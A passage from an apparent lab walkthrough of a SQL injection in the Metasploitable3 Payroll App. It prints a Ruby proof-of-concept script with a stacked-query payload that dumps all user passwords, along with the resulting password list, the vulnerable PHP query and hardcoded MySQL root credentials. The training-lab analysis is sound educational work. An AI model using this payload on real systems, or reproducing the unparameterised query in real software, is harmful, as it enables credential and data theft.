\"*payroll*\" 2> /dev/null\n/var/lib/mysql-default/payroll\n/var/www/html/payroll_app.php\n/home/kylo_ren/poc/payroll_app</code></pre></div>\n<p>A total of three search hits. Even from the naming and location, we can gather a lot of information about these:</p>\n<ol>\n<li><code class=\"language-text\">/var/lib/mysql-default/payroll</code>: A folder in for MySQL, most likely contains the database named <em>payroll</em>, with one or more tables.</li>\n<li><code class=\"language-text\">/var/www/html/payroll_app.php</code>: The website we performed the SQL Injection attack against. Will contain the source code, written in PHP, that powers the <em>Payroll App</em>.</li>\n<li><code class=\"language-text\">/home/kylo_ren/poc/payroll_app</code>: This one is a little strange. It is a directory in the home folder of the <code class=\"language-text\">kylo_ren</code> user. If the Star Wars movies are anything to go by, this is probably something malicious!</li>\n</ol>\n<h4 id=\"kylo-rens-ruby-exploit\" style=\"position:relative;\"><a href=\"#kylo-rens-ruby-exploit\" aria-label=\"kylo rens ruby exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kylo Ren’s Ruby Exploit</h4>\n<p>It would make the most logical sense to start with the PHP source code for the website… However, I am fascinated by what is in <code class=\"language-text\">kylo_ren</code>s home folder. A quick listing of the folder revealed one file called: <code class=\"language-text\">poc.rb</code>, that had the following contents:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre class=\"language-ruby\"><code class=\"language-ruby\"><span class=\"token keyword\">require</span> <span class=\"token string\">'net/http'</span>\n\nurl  <span class=\"token operator\">=</span> <span class=\"token string\">\"http://127.0.0.1/payroll_app.php\"</span>\nuri  <span class=\"token operator\">=</span> <span class=\"token constant\">URI</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\nuser <span class=\"token operator\">=</span> <span class=\"token string\">'luke_skywalker'</span>\ninjection <span class=\"token operator\">=</span> <span class=\"token string\">\"password'; select password from users where username='' OR ''='\"</span>\n\nputs <span class=\"token string\">\"Making POST request to <span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>uri<span class=\"token delimiter tag\">}</span></span> with the following parameters:\"</span>\nputs <span class=\"token string\">\"'user' = <span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>user<span class=\"token delimiter tag\">}</span></span>\"</span>\nputs <span class=\"token string\">\"'password' = <span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>injection<span class=\"token delimiter tag\">}</span></span>\"</span>\nres <span class=\"token operator\">=</span> <span class=\"token constant\">Net</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">HTTP</span><span class=\"token punctuation\">.</span>post_form<span class=\"token punctuation\">(</span>uri<span class=\"token punctuation\">,</span> <span class=\"token string\">'user'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> user<span class=\"token punctuation\">,</span> <span class=\"token string\">'password'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> injection<span class=\"token punctuation\">,</span> <span class=\"token string\">'s'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'OK'</span><span class=\"token punctuation\">)</span>\n\nputs <span class=\"token string\">\"Response body is <span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>res<span class=\"token punctuation\">.</span>body<span class=\"token delimiter tag\">}</span></span>\"</span>\nputs <span class=\"token string\">\"Done\"</span></code></pre></div>\n<p>Considering that Kylo is neck-deep in the dark side, it comes as no surprise he has a malicious Ruby script that attacks the <em>Payroll App</em> website. The script automates a similar attack to what we performed earlier. Kylo uses the username <code class=\"language-text\">luke_skywalker</code> and a password that is a SQL injection attack. The actual SQL Injection entered is:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">password'; select password from users where username='' OR ''='</code></pre></div>\n<p>Comparing this to the initial attack we performed early is interesting. It also revealed some more useful information about the SQL Injection vulnerability. Turns out, an attacker can enter any username and password combination on the page and review results. I initially thought that a user would have to authenticate (with username and password) before any information was displayed. Turns out that the web application returns an empty table when the incorrect username and password are entered. Interesting.</p>\n<p>Anyway, the resultant output of the attack lists all the passwords for the users in the database. However, it does not list the username next to the password, so some guessing and/or correlation needs to be performed. To run the script, use the following command:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">leia_organa@metasploitable3-ub1404:/home/kylo_ren/poc/payroll_app$ ruby poc.rb </code></pre></div>\n<p>The output of the script is listed below, with some formatting applied to the HTML portion to enhance readability:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\">Making POST request to http://127.0.0.1/payroll_app.php with the following parameters:\n'user' = luke_skywalker\n'password' = password'; select password from users where username='' OR ''='\nResponse body is \n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Welcome, luke_skywalker<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>table</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span><span class=\"token value css language-css\"><span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 25px<span class=\"token punctuation\">;</span> <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 2px solid black<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">'</span></span></span> <span class=\"token attr-name\">cellspacing</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>30</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Username<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>First Name<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Last Name<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Salary<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Welcome, luke_skywalker<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>table</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span><span class=\"token value css language-css\"><span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 25px<span class=\"token punctuation\">;</span> <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 2px solid black<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">'</span></span></span> <span class=\"token attr-name\">cellspacing</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>30</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n         <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Username<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n         <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>First Name<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n         <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Last Name<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n         <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Salary<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>help_me_obiwan<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>like_my_father_beforeme<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>nerf_herder<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>b00p_b33p<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Pr0t0c07<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>thats_no_m00n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Dark_syD3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>but_master:(<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>mesah_p@ssw0rd<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>@dm1n1str8r<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>mandalorian1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>my_kinda_skum<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>hanSh0tF1rst<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>rwaaaaawr8<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Daddy_Issues2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>table</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>\nDone</code></pre></div>\n<h4 id=\"vulnerabilities-in-the-payroll_appphp-source-code\" style=\"position:relative;\"><a href=\"#vulnerabilities-in-the-payroll_appphp-source-code\" aria-label=\"vulnerabilities in the payroll_appphp source code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerabilities in the <code class=\"language-text\">payroll_app.php</code> Source Code</h4>\n<p>OK, that was interesting, but back to business. We are going to analyze the actual web application code that is causing the SQL Injection vulnerability. The previous results from the <code class=\"language-text\">find</code> command indicated that the web application was stored in the default location of <code class=\"language-text\">/var/www/html</code>. The file can easily be viewed using: <code class=\"language-text\">cat /var/www/html/payroll_app.php</code>. After having a quick browse over the code, there are three main blocks:</p>\n<ol>\n<li>PHP code to connect to the database</li>\n<li>HTML code to produce the form on the <em>Payroll App</em> page</li>\n<li>PHP code to post the contents of the form</li>\n</ol>\n<p>The first part of the <code class=\"language-text\">payroll_app.php</code> code connects to the local MySQL database. The code is listed below for reference.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'sploitme'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'payroll'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Connection failed: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p>Unfortunately, the username and password (and database name) are documented in clear text. The user account is <code class=\"language-text\">root</code>, the password is <code class=\"language-text\">sploitme</code> and the database name is <code class=\"language-text\">payroll</code>. This information had not yet been found and allows connection to the MySQL database. For example, you could use the command: <code class=\"language-text\">mysql -uroot -psploitme</code> to connect to the MySQL database and execute commands (e.g., replace users, change passwords, remove or add tables etc.).</p>\n<p>The next chunk of the <code class=\"language-text\">payroll_app.php</code> is boring. It is a simple form to let users login. It is displayed below for thoroughness.</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token prolog\">&lt;?php\nif (!isset($_POST['s'])) {\n?></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Payroll Login<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>table</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 25px<span class=\"token punctuation\">;</span> <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 2px solid black<span class=\"token punctuation\">;</span> <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 20px<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>User<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>user<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>Password<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span>\n       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>OK<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>s<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>table</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token prolog\">&lt;?php\n}\n?></span></code></pre></div>\n<p>The final portion of the <code class=\"language-text\">payroll_app.php</code> is where the action happens. If a form post is submitted, the following code is executed. Basically, when the form is submitted it executes a query against the database and displays the results of the SQL query in a table. The posted values are, of course, the <code class=\"language-text\">username</code> and <code class=\"language-text\">password</code> values from the HTML login form. The entire block of code is displayed below:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select username, first_name, last_name, salary from users where username = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' and password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>'\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">multi_query</span><span class=\"token punctuation\">(</span><span class=\"token 